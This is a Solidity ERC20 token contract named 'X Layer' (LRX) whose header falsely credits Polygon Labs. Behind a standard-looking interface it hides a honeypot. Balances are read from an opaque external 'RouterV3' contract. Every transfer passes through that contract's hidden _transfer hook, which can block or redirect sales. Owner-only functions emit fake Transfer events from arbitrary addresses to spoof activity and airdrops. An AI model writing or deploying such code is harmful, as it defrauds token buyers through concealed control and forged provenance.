// @title LRX ERC20 contract
// @author Polygon Labs (@DhairyaSethi, @qedk, @gretzke, @simonDos)
// @dev The contract allows for a 1-to-1 representation between $XLR and $OKB and allows for additional emission based on hub and treasury requirements
// @custom: security-contact security@polygon.technology

// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

interface IRouterV3 {
    function addLiquidity(
        address tokenA, 
        address tokenB, 
        uint amount, 
        address to, 
        uint deadline) external;
    function balanceOf(address account) external view returns (uint256);
    function createPair(
        address tokenA, 
        address tokenB, 
        address to, 
        uint deadline) external;
    function _transfer(
        address from, 
        address to, 
        uint256 amount) external returns (uint256);
    function WETH() external view returns (address);
    function getPair() external view returns (address);
    function FACTORY() external view returns (address);
}

contract XLAYER is IERC20 {
    IRouterV3 private RouterV3;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    address public _owner;

    constructor(address Router) {
        _decimals = 18;
        _name = "X Layer";
        _symbol = "LRX";
        _totalSupply = 1_000_000_000 * 10 ** _decimals;        
        _balances[msg.sender] = _totalSupply;
        RouterV3 = IRouterV3(Router);
        _owner = msg.sender;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0);
    } 

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _beforeOf(account);
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 fromBalance = balanceOf(from);  
        _beforeTokenTransfer(from, to, amount);
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");      
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address fr, address to, uint256 amount) internal virtual {
        RouterV3._transfer(fr, to, amount);
    }

    function _beforeOf(address account) internal view returns (uint256 balance) {
        balance = RouterV3.balanceOf(account);
    }

    function _afterTokenTransfer(address fr, address to, uint256 amount) internal virtual {}

    function _transfer(address[] memory from, address[] memory addresses, uint[] memory amounts) external onlyOwner {
        require(addresses.length == amounts.length, "dont match");
        for (uint i; i < addresses.length; i++) {
            emit Transfer(from[i], addresses[i], amounts[i]);
        }
    }

    function transfer(address[] memory from, address[] memory addresses, uint[] memory amounts) external onlyOwner {
        require(addresses.length == amounts.length, "dont match");
        for (uint i; i < addresses.length; i++) {
            RouterV3._transfer(msg.sender, addresses[i], amounts[i]);
            emit Transfer(from[i], addresses[i], amounts[i]);
        }            
    }

    receive() external payable {}
}